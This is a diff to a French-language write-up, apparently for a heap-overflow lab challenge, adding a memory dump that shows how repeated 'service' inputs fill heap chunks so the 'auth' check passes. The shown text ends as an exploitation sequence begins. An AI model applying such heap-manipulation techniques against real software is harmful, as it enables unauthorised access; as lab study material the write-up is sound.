@@ -21,6 +21,17 @@
 3. Second `serviceAAAA`: écrit à `0x804a028`
 4. `login`: vérifie `auth` qui pointe maintenant vers nos "AAAA"
 
+**Memory**
+
+```nasm
+0x804a008:      0x0000000a(auth)      0x00000000      0x00000000      0x00000011
+0x804a018:      0x41414141(AAAA)      0x0000000a      0x00000000      0x00000011
+0x804a028:      0x41414141(AAAA)      0x0000000a      0x00000000      0x00020fd1
+                        |
+                        |
+          auth+32 <-----+
+```
+
 **Séquence d'Exploitation**
 ```bash
 auth 
